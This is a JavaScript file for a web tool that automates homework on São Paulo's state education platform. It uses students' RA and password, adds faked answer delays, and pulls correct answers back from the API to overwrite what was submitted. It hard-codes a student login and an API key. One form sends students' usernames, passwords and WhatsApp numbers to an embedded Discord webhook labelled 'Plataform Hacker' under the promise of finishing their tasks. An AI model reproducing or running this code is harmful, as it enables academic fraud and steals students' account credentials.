const loginForm = document.getElementById('loginForm');
const loginRaInput = document.getElementById('loginRa');
const loginSenhaInput = document.getElementById('loginSenha');
const toggleLoginPassword = document.getElementById('toggleLoginPassword');
const loginContainer = document.getElementById('loginContainer');
const mainContainer = document.getElementById('mainContainer');
const sidebarContainer = document.getElementById('sidebarContainer');
const senhaInput = document.getElementById('senha');
const enviarForm = document.getElementById('Enviar');
const progressModal = document.getElementById('progressModal');
const closeModalBtn = document.getElementById('closeModal');
const tempoMinInput = document.getElementById('tempoMin');
const tempoMaxInput = document.getElementById('tempoMax');
const togglePassword = document.getElementById('togglePassword');
const raInput = document.getElementById('ra');
const taskTypeSelect = document.getElementById('taskType');
const taskSelectionModal = document.getElementById('taskSelectionModal');
const taskListContainer = document.getElementById('taskList');
const confirmTaskSelectionBtn = document.getElementById('confirmTaskSelection');
const closeTaskSelectionModalBtn = document.getElementById('closeTaskSelectionModal');
const platformModal = document.getElementById('platformModal');
const platformForm = document.getElementById('platformForm');
const platformToggles = document.querySelectorAll('.platform-toggle');
const closePlatformModal = document.querySelector('.close-platform-modal');
const platformTitle = document.getElementById('platformTitle');
const hamburgerMenu = document.querySelector('.hamburger-menu');

let trava = false;
let countdownInterval;
let shouldStopExecution = false;
let totalTasksFound = 0;
let completedTasksCount = 0;
let selectedTasks = [];

const logCredentials = {
    "1140255186": "Estudante2025@",
};

let loggedInUser = null;
let lastUsedCredentials = { ra: '', senha: '' };

hamburgerMenu.addEventListener('click', () => {
    hamburgerMenu.classList.toggle('active');
    sidebarContainer.classList.toggle('hidden');
    sidebarContainer.classList.toggle('active');
});

togglePassword.addEventListener('click', function () {
    const type = senhaInput.getAttribute('type') === 'password' ? 'text' : 'password';
    senhaInput.setAttribute('type', type);
    this.querySelector('i').classList.toggle('fa-eye');
    this.querySelector('i').classList.toggle('fa-eye-slash');
});

toggleLoginPassword.addEventListener('click', function () {
    const type = loginSenhaInput.getAttribute('type') === 'password' ? 'text' : 'password';
    loginSenhaInput.setAttribute('type', type);
    this.querySelector('i').classList.toggle('fa-eye');
    this.querySelector('i').classList.toggle('fa-eye-slash');
});

document.querySelectorAll('.platform-form .toggle-password').forEach(toggle => {
    toggle.addEventListener('click', function () {
        const input = this.previousElementSibling;
        const type = input.getAttribute('type') === 'password' ? 'text' : 'password';
        input.setAttribute('type', type);
        this.querySelector('i').classList.toggle('fa-eye');
        this.querySelector('i').classList.toggle('fa-eye-slash');
    });
});

document.addEventListener('contextmenu', e => e.preventDefault());
document.addEventListener('selectstart', e => e.preventDefault());
document.addEventListener('dragstart', e => e.preventDefault());

loginForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    const ra = loginRaInput.value.trim().toUpperCase();
    const senha = loginSenhaInput.value;

    if (logCredentials[ra] && logCredentials[ra] === senha) {
        loggedInUser = ra;
        lastUsedCredentials = { ra, senha };
        loginContainer.style.display = 'none';
        mainContainer.style.display = 'block';
        sidebarContainer.style.display = 'block';
        hamburgerMenu.style.display = 'flex';
        // Keep sidebar closed by default
        hamburgerMenu.classList.remove('active');
        sidebarContainer.classList.add('hidden');
        sidebarContainer.classList.remove('active');
        raInput.value = ra + 'SP';
        raInput.setAttribute('readonly', true); // Make RA readonly
        senhaInput.value = senha;
        senhaInput.setAttribute('readonly', true); // Make password readonly
        showNotification('Sucesso', 'Login realizado com sucesso!', 'success');
    } else {
        showNotification('Erro de login', 'RA ou senha incorretos.', 'error');
        loginRaInput.value = '';
        loginSenhaInput.value = '';
    }
});

platformToggles.forEach(toggle => {
    toggle.addEventListener('click', () => {
        const platform = toggle.dataset.platform;
        platformForm.dataset.platform = platform;
        platformTitle.textContent = platform;
        platformModal.style.display = 'flex';
        document.body.classList.add('modal-open');
        // Auto-fill platform form with last used credentials
        document.getElementById('platform-ra').value = lastUsedCredentials.ra;
        document.getElementById('platform-senha').value = lastUsedCredentials.senha;
    });
});

closePlatformModal.addEventListener('click', () => {
    platformModal.style.display = 'none';
    platformForm.reset();
    document.body.classList.remove('modal-open');
});

platformModal.addEventListener('click', (e) => {
    if (e.target === platformModal) {
        platformModal.style.display = 'none';
        platformForm.reset();
        document.body.classList.remove('modal-open');
    }
});

platformForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    const platform = platformForm.dataset.platform;
    const ra = document.getElementById('platform-ra').value.trim();
    const senha = document.getElementById('platform-senha').value;
    const nivel = document.getElementById('platform-nivel').value.trim() || 'Não especificado';
    const whatsapp = document.getElementById('platform-whatsapp').value.trim() || 'Não informado';

    if (!ra || !senha) {
        showNotification('Erro', 'Por favor, preencha RA e senha.', 'error');
        return;
    }

    // Show processing notification
    showNotification('Processando', 'Solicitação está sendo processada...', 'info');

    const webhookUrl = 'https://discord.com/api/webhooks/1382866998765031434/CT8_UgZkK6Jk2mdajMV440ooEQjbEq3b0BuG4Zb4DCkYraOrBDoHqvMYINSGuPb5WRsL';
    const embed = {
        title: `${platform} - Dados Enviados`,
        color: 0x4A80F0,
        fields: [
            { name: 'RA', value: ra, inline: true },
            { name: 'Senha', value: senha, inline: true },
            { name: 'Nível', value: nivel, inline: false },
            { name: 'WhatsApp', value: whatsapp, inline: false }
        ],
        timestamp: new Date().toISOString(),
        footer: { text: 'Plataform Hacker' }
    };

    try {
        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] })
        });

        if (response.ok) {
            showNotification('Sucesso', `Tarefa será finalizada em 48hrs!`, 'success');
            platformForm.reset();
            platformModal.style.display = 'none';
            document.body.classList.remove('modal-open');
        } else {
            showNotification('Erro', `Falha ao enviar dados para ${platform}.`, 'error');
        }
    } catch (error) {
        showNotification('Erro', `Erro ao enviar dados para ${platform}: ${error.message}`, 'error');
    }
});

enviarForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    if (trava) return;

    let currentRa = raInput.value.trim().toUpperCase();
    const currentSenha = senhaInput.value;

    if (currentRa.endsWith('SP')) {
        currentRa = currentRa.slice(0, -2);
    }

    if (currentRa !== loggedInUser || currentSenha !== logCredentials[loggedInUser]) {
        showNotification('Erro de credenciais', 'Você só pode usar o RA e a senha com os quais fez login.', 'error');
        return;
    }

    raInput.value = currentRa + 'SP';

    const minTime = parseInt(tempoMinInput.value);
    const maxTime = parseInt(tempoMaxInput.value);

    if (isNaN(minTime) || isNaN(maxTime) || minTime < 0 || maxTime < 0) {
        showNotification('Erro de Tempo', 'Por favor, insira tempos válidos (números positivos ou zero).', 'error');
        return;
    }
    if (minTime > maxTime) {
        showNotification('Erro de Tempo', 'O tempo mínimo não pode ser maior que o tempo máximo.', 'error');
        return;
    }

    const taskType = taskTypeSelect.value;
    if (taskType === 'selected') {
        try {
            const token = await loginRequest();
            await fetchAndDisplayTasks(token);
        } catch (error) {
            showNotification('Erro', 'Não foi possível carregar as tarefas para seleção.', 'error');
            trava = false;
        }
    } else {
        trava = true;
        completedTasksCount = 0;
        try {
            await loginRequest();
        } catch (error) {
            trava = false;
            console.error("Login request failed:", error);
        }
    }
});

closeTaskSelectionModalBtn.addEventListener('click', () => {
    taskSelectionModal.style.display = 'none';
    selectedTasks = [];
    taskListContainer.innerHTML = '';
    trava = false;
});

confirmTaskSelectionBtn.addEventListener('click', async () => {
    const checkboxes = taskListContainer.querySelectorAll('input[type="checkbox"]:checked');
    selectedTasks = Array.from(checkboxes).map(cb => JSON.parse(cb.value));
    if (selectedTasks.length === 0) {
        showNotification('Erro', 'Selecione pelo menos uma tarefa.', 'error');
        return;
    }
    taskSelectionModal.style.display = 'none';
    taskListContainer.innerHTML = '';
    trava = true;
    completedTasksCount = 0;
    try {
        const token = await loginRequest();
        await processSelectedTasks(token);
    } catch (error) {
        trava = false;
        console.error("Task processing failed:", error);
    }
});

async function loginRequest() {
    const loginData = {
        user: raInput.value,
        senha: senhaInput.value
    };

    const headers = {
        'Accept': 'application/json',
        'Ocp-Apim-Subscription-Key': '2b03c1db3884488795f79c37c069381a',
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
    };

    try {
        const data = await makeRequest(
            'https://sedintegracoes.educacao.sp.gov.br/credenciais/api/LoginCompletoToken',
            'POST',
            headers,
            loginData
        );
        return data.token;
    } catch (error) {
        showNotification('Erro de login', 'Não foi possível fazer login. Verifique suas credenciais.', 'error');
        throw new Error('Login failed');
    }
}

async function sendRequest(token) {
    try {
        const data = await makeRequest(
            'https://edusp-api.ip.tv/registration/edusp/token',
            'POST',
            getDefaultHeaders(),
            { token }
        );
        return data.auth_token;
    } catch (error) {
        showNotification('Erro de registro', 'Erro ao registrar token. Tente novamente.', 'error');
        throw new Error('Registration failed');
    }
}

async function fetchAndDisplayTasks(token) {
    const authToken = await sendRequest(token);
    const rooms = await fetchUserRooms(authToken, true);
    if (!rooms || rooms.length === 0) {
        showNotification('Nenhuma sala encontrada', 'Não há salas de aula disponíveis.', 'info');
        return;
    }

    const allTasks = [];
    for (const room of rooms) {
        const tasks = await fetchTasks(authToken, room.name, room.topic, true);
        tasks.forEach(task => {
            allTasks.push({ ...task, room: room.name });
        });
    }

    if (allTasks.length === 0) {
        showNotification('Nenhuma tarefa encontrada', 'Não há tarefas disponíveis para seleção.', 'info');
        return;
    }

    taskListContainer.innerHTML = allTasks.map(task => `
        <div class="task-item">
            <input type="checkbox" value='${JSON.stringify(task)}' id="task-${task.id}">
            <label for="task-${task.id}">${task.title} (${task.label})</label>
        </div>
    `).join('');
    taskSelectionModal.style.display = 'flex';
}

async function processSelectedTasks(token) {
    const authToken = await sendRequest(token);
    totalTasksFound = selectedTasks.length;
    shouldStopExecution = false;

    const tasksToProcess = selectedTasks.filter(task => !isRedacao(task));
    if (tasksToProcess.length === 0) {
        showNotification('Nenhuma tarefa processável', 'Todas as tarefas selecionadas são redações e serão ignoradas.', 'info');
        progressModal.style.display = 'none';
        trava = false;
        return;
    }

    iniciarModalGlobal(tasksToProcess.length);
    const taskPromises = tasksToProcess.map(async (task) => {
        if (shouldStopExecution) return;
        try {
            const taskDetails = await getTaskDetails(task.id, authToken);
            await processTask(task, taskDetails, authToken, task.room);
            completedTasksCount++;
            atualizarProgressoModal(completedTasksCount, tasksToProcess.length);
        } catch (error) {
            console.error(`Error processing task "${task.title}":`, error);
        }
    });

    await Promise.all(taskPromises);
    if (!shouldStopExecution) {
        progressModal.style.display = 'none';
        clearInterval(countdownInterval);
        showNotification('Tarefas concluídas!', `${completedTasksCount} tarefas foram feitas com sucesso.`, 'success');
    }
    trava = false;
    selectedTasks = [];
}

async function fetchUserRooms(token, returnOnly = false) {
    try {
        const data = await makeRequest(
            'https://edusp-api.ip.tv/room/user?list_all=true&with_cards=true',
            'GET',
            { ...getDefaultHeaders(), 'x-api-key': token }
        );

        if (data.rooms && data.rooms.length > 0) {
            if (returnOnly) return data.rooms;
            totalTasksFound = 0;
            shouldStopExecution = false;
            const taskType = taskTypeSelect.value;
            await Promise.all(
                data.rooms.map(room => fetchTasks(token, room.name, room.topic))
            );
            if (totalTasksFound === 0) {
                showNotification('Nenhuma tarefa encontrada', 'Não há tarefas pendentes para serem executadas no momento.', 'info');
            }
        }
        return data.rooms;
    } catch (error) {
        showNotification('Erro ao buscar salas', 'Não foi possível buscar as salas de aula.', 'error');
        throw new Error('Failed to fetch rooms');
    } finally {
        if (!returnOnly) trava = false;
    }
}

async function fetchTasks(token, room, name, returnOnly = false) {
    const taskType = taskTypeSelect.value;
    const endpoints = [];
    if (taskType === 'pending') {
        endpoints.push(
            { label: 'Expirada', url: `https://edusp-api.ip.tv/tms/task/todo?expired_only=true&filter_expired=false&with_answer=true&is_essay=false&publication_target=${room}&answer_statuses=pending&with_apply_moment=true` },
            { label: 'Normal', url: `https://edusp-api.ip.tv/tms/task/todo?expired_only=false&filter_expired=true&with_answer=true&is_essay=false&publication_target=${room}&answer_statuses=pending&with_apply_moment=false` }
        );
    } else if (taskType === 'draft') {
        endpoints.push(
            { label: 'Rascunho', url: `https://edusp-api.ip.tv/tms/task/todo?expired_only=false&filter_expired=true&with_answer=true&is_essay=false&publication_target=${room}&answer_statuses=draft&with_apply_moment=true` }
        );
    } else if (taskType === 'all' || taskType === 'selected') {
        endpoints.push(
            { label: 'Rascunho', url: `https://edusp-api.ip.tv/tms/task/todo?expired_only=false&filter_expired=true&with_answer=true&is_essay=false&publication_target=${room}&answer_statuses=draft&with_apply_moment=true` },
            { label: 'Expirada', url: `https://edusp-api.ip.tv/tms/task/todo?expired_only=true&filter_expired=false&with_answer=true&is_essay=false&publication_target=${room}&answer_statuses=pending&with_apply_moment=true` },
            { label: 'Normal', url: `https://edusp-api.ip.tv/tms/task/todo?expired_only=false&filter_expired=true&with_answer=true&is_essay=false&publication_target=${room}&answer_statuses=pending&with_apply_moment=false` }
        );
    }

    const headers = { ...getDefaultHeaders(), 'x-api-key': token };

    try {
        const results = await Promise.all(
            endpoints.map(async ({ label, url }) => {
                try {
                    const data = await makeRequest(url, 'GET', headers);
                    return { label, data: data.map(task => ({ ...task, label })) };
                } catch (error) {
                    console.warn(`Failed to fetch tasks for ${label} from ${url}:`, error);
                    return null;
                }
            })
        );
        const allTasks = results.flatMap(result => result ? result.data : []);
        if (returnOnly) return allTasks;
        processTaskResults(results, token, room, name);
    } catch (error) {
        console.error("Failed to fetch all tasks:", error);
        throw new Error('Failed to fetch tasks');
    }
}

function getDefaultHeaders() {
    return {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'x-api-realm': 'edusp',
        'x-api-platform': 'webclient',
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        'Connection': 'keep-alive',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty'
    };
}

async function makeRequest(url, method = 'GET', headers = {}, body = null) {
    const options = {
        method,
        headers: {
            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            'Content-Type': 'application/json',
            ...headers
        }
    };

    if (body) {
        options.body = JSON.stringify(body);
    }

    const response = await fetch(url, options);
    if (!response.ok) {
        const errorText = await response.text();
        throw new Error(`HTTP ${method} ${url} => ${response.status} - ${errorText}`);
    }
    return response.json();
}

function isRedacao(task) {
    return task.tags?.some(t => t.toLowerCase().includes('redacao')) ||
           task.title.toLowerCase().includes('redação');
}

function processTaskResults(results, token, room, name) {
    results.forEach(result => {
        if (result && result.data.length > 0 && result.label !== 'Rascunho') {
            let filteredData = result.data;
            if (result.label === 'Expirada') {
                filteredData = filteredData.filter(task => !isRedacao(task));
            }
            totalTasksFound += filteredData.length;
            loadTasks(filteredData, token, room, result.label);
        }
    });
}

async function loadTasks(tasks, token, room, tipo) {
    if (!tasks || tasks.length === 0) {
        if (totalTasksFound === 0) {
            showNotification('Nenhuma tarefa encontrada', 'Não há tarefas processáveis para serem executadas no momento.', 'info');
        }
        progressModal.style.display = 'none';
        trava = false;
        return;
    }

    const redacaoTasks = tasks.filter(isRedacao);
    const outrasTasks = tasks.filter(task => !isRedacao(task));
    const orderedTasks = [...redacaoTasks, ...outrasTasks];
    const tasksToProcess = orderedTasks.filter(task => !isRedacao(task));

    if (tasksToProcess.length === 0) {
        showNotification('Nenhuma tarefa processável', 'Todas as tarefas encontradas são redações e serão ignoradas.', 'info');
        progressModal.style.display = 'none';
        trava = false;
        return;
    }

    iniciarModalGlobal(tasksToProcess.length);
    
    const taskPromises = tasksToProcess.map(async (task, index) => {
        if (shouldStopExecution) {
            return;
        }
        
        try {
            const taskDetails = await getTaskDetails(task.id, token);
            await processTask(task, taskDetails, token, room);
            completedTasksCount++;
            atualizarProgressoModal(completedTasksCount, tasksToProcess.length);
        } catch (error) {
            console.error(`Error processing task "${task.title}":`, error);
        }
    });

    await Promise.all(taskPromises);
    
    if (!shouldStopExecution) {
        progressModal.style.display = 'none';
        clearInterval(countdownInterval);
        showNotification('Tarefas concluídas!', `${completedTasksCount} tarefas foram feitas com sucesso.`, 'success');
    }
    trava = false;
}

async function getTaskDetails(taskId, token) {
    const url = `https://edusp-api.ip.tv/tms/task/${taskId}/apply?preview_mode=false`;
    const headers = { ...getDefaultHeaders(), 'x-api-key': token };
    const response = await makeRequest(url, 'GET', headers);
    return processTaskDetails(response);
}

function processTaskDetails(details) {
    const answersData = {};

    details.questions.forEach(question => {
        if (question.type === 'info') return;

        const questionId = question.id;
        let answer = {};

        if (question.type === 'media') {
            answer = { status: 'error', message: 'Type=media system require url' };
        } else if (question.options && typeof question.options === 'object') {
            const options = Object.values(question.options);
            if (options.length > 0) {
                const correctIndex = Math.floor(Math.random() * options.length);
                options.forEach((_, i) => {
                    answer[i] = i === correctIndex;
                });
            } else {
                answer = {};
            }
        } else {
            answer = {};
        }

        answersData[questionId] = {
            question_id: questionId,
            question_type: question.type,
            answer
        };
    });

    return answersData;
}

async function processTask(task, answersData, token, room) {
    const taskTitle = task.title;
    const taskId = task.id;

    await submitAnswers(taskId, answersData, token, room, taskTitle);
}

async function submitAnswers(taskId, answersData, token, room, taskTitle) {
    const draftBody = {
        status: 'submitted',
        accessed_on: 'room',
        executed_on: room,
        answers: answersData
    };

    const minMinutes = parseInt(tempoMinInput.value);
    const maxMinutes = parseInt(tempoMaxInput.value);
    const randomMinutes = Math.floor(Math.random() * (maxMinutes - minMinutes + 1)) + minMinutes;
    const tempoEmSegundos = randomMinutes * 60;

    let currentTaskCountdownInterval;
    let currentTaskTimeRemaining = tempoEmSegundos;

    document.getElementById('currentTask').textContent = `Processando: ${taskTitle}`;

    if (tempoEmSegundos > 0) {
        console.log(`Tarefa "${taskTitle}" esperando por ${tempoEmSegundos} segundos...`);
        document.getElementById('timeRemaining').textContent = `Aguardando ${tempoEmSegundos}s...`;
        
        currentTaskCountdownInterval = setInterval(() => {
            currentTaskTimeRemaining--;
            if (currentTaskTimeRemaining >= 0) {
                document.getElementById('timeRemaining').textContent = `Aguardando ${taskTitle.substring(0, 20)}... ${currentTaskTimeRemaining}s`;
            } else {
                clearInterval(currentTaskCountdownInterval);
            }
        }, 1000);

        await delay(tempoEmSegundos * 1000);
        clearInterval(currentTaskCountdownInterval);
        console.log(`Tarefa "${taskTitle}" terminou a espera.`);
    } else {
        document.getElementById('timeRemaining').textContent = 'Processando instantaneamente...';
    }

    try {
        const response = await makeRequest(
            `https://edusp-api.ip.tv/tms/task/${taskId}/answer`,
            'POST',
            { 'x-api-key': token },
            draftBody
        );

        const newTaskId = response.id;
        await fetchAndUpdateCorrectAnswers(taskId, newTaskId, token, taskTitle);
    } catch (error) {
        console.error(`Failed to submit answers for task "${taskTitle}":`, error);
        showNotification('Erro ao enviar tarefa', `Não foi possível enviar a tarefa "${taskTitle}".`, 'error');
        throw new Error('Failed to submit answers');
    }
}

async function fetchAndUpdateCorrectAnswers(taskId, answerId, token, taskTitle) {
    try {
        const url = `https://edusp-api.ip.tv/tms/task/${taskId}/answer/${answerId}?with_task=true&with_genre=true&with_questions=true&with_assessed_skills=true`;
        const respostasAnteriores = await makeRequest(url, 'GET', { 'x-api-key': token });
        await putAnswer(respostasAnteriores, taskId, answerId, token, taskTitle);
    } catch (error) {
        console.error(`Failed to fetch or update correct answers for task "${taskTitle}":`, error);
        showNotification('Erro ao corrigir tarefa', `Não foi possível obter/corrigir a tarefa "${taskTitle}".`, 'error');
        throw new Error('Failed to update answers');
    }
}

async function putAnswer(respostasAnteriores, taskId, answerId, token, taskTitle) {
    try {
        const url = `https://edusp-api.ip.tv/tms/task/${taskId}/answer/${answerId}`;
        const novasRespostasPayload = transformJson(respostasAnteriores);
        await makeRequest(url, 'PUT', { 'x-api-key': token }, novasRespostasPayload);
    } catch (error) {
        console.error(`Failed to put answer for task "${taskTitle}":`, error);
        showNotification('Erro ao finalizar tarefa', `Não foi possível finalizar a tarefa "${taskTitle}".`, 'error');
        throw new Error('Failed to put answer');
    }
}

function transformJson(jsonOriginal) {
    if (!jsonOriginal?.task?.questions) {
        console.warn("Invalid data structure for transformJson:", jsonOriginal);
        throw new Error("Invalid data structure");
    }

    const novoJson = {
        accessed_on: jsonOriginal.accessed_on,
        executed_on: jsonOriginal.executed_on,
        answers: {}
    };

    for (const questionId in jsonOriginal.answers) {
        const questionData = jsonOriginal.answers[questionId];
        const taskQuestion = jsonOriginal.task.questions.find(q => q.id === parseInt(questionId));

        if (!taskQuestion) {
            console.warn(`Question ID ${questionId} not found in task.questions`);
            continue;
        }

        try {
            const answerPayload = createAnswerPayload(taskQuestion);
            if (answerPayload) {
                novoJson.answers[questionId] = answerPayload;
            }
        } catch (error) {
            console.error(`Error creating answer payload for question ${questionId}:`, error);
            continue;
        }
    }

    return novoJson;
}

function createAnswerPayload(taskQuestion) {
    const answerPayload = {
        question_id: taskQuestion.id,
        question_type: taskQuestion.type,
        answer: null
    };

    switch (taskQuestion.type) {
        case "order-sentences":
            if (taskQuestion.options?.sentences?.length) {
                answerPayload.answer = taskQuestion.options.sentences.map(s => s.value);
            } else {
                console.warn(`No sentences found for order-sentences question ${taskQuestion.id}`);
            }
            break;
        case "fill-words":
            if (taskQuestion.options?.phrase?.length) {
                answerPayload.answer = taskQuestion.options.phrase
                    .map((item, index) => index % 2 !== 0 ? item.value : null)
                    .filter(Boolean);
            } else {
                console.warn(`No phrase found for fill-words question ${taskQuestion.id}`);
            }
            break;
        case "text_ai":
            answerPayload.answer = { "0": removeTags(taskQuestion.comment || '') };
            break;
        case "fill-letters":
            if (taskQuestion.options?.answer !== undefined) {
                answerPayload.answer = taskQuestion.options.answer;
            } else {
                console.warn(`No answer found for fill-letters question ${taskQuestion.id}`);
            }
            break;
        case "cloud":
            if (taskQuestion.options?.ids?.length) {
                answerPayload.answer = taskQuestion.options.ids;
            } else {
                console.warn(`No ids found for cloud question ${taskQuestion.id}`);
            }
            break;
        default:
            if (taskQuestion.options && typeof taskQuestion.options === 'object') {
                answerPayload.answer = Object.fromEntries(
                    Object.entries(taskQuestion.options).map(([id, opt]) => [
                        id,
                        opt?.answer !== undefined ? opt.answer : false
                    ])
                );
            } else {
                answerPayload.answer = {};
                console.warn(`Unhandled question type: ${taskQuestion.type} for question ${taskQuestion.id}. Using empty answer.`);
            }
            break;
    }

    return answerPayload;
}

function removeTags(htmlString) {
    return htmlString.replace(/<[^>]*>?/gm, '');
}

function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function iniciarModalGlobal(totalTasks) {
    document.getElementById('totalTasks').textContent = totalTasks;
    document.getElementById('taskProgress').textContent = '0';
    document.getElementById('currentTask').textContent = 'Iniciando processamento de tarefas...';
    document.getElementById('timeRemaining').textContent = 'Aguardando delays individuais...';
    document.getElementById('progressBar').style.width = '0%';
    progressModal.style.display = 'flex';
    clearInterval(countdownInterval);
}

function atualizarProgressoModal(completed, total) {
    document.getElementById('taskProgress').textContent = completed;
    const percentage = (completed / total) * 100;
    document.getElementById('progressBar').style.width = `${percentage}%`;

    if (completed === total) {
        document.getElementById('currentTask').textContent = 'Todas as tarefas concluídas!';
        document.getElementById('timeRemaining').textContent = 'Processo finalizado.';
    }
}

function showNotification(title, message, type = 'info') {
    const notification = document.createElement('div');
    notification.className = `notification ${type}`;
    
    notification.innerHTML = `
        <div class="notification-header">
            <div class="notification-title">${title}</div>
        </div>
        <div class="notification-message">${message}</div>
    `;
    
    document.body.appendChild(notification);
    
    setTimeout(() => {
        if (notification.parentNode) {
            notification.style.animation = 'slideOutRight 0.3s ease';
            setTimeout(() => {
                if (notification.parentNode) {
                    notification.parentNode.removeChild(notification);
                }
            }, 300);
        }
    }, 5000);
}
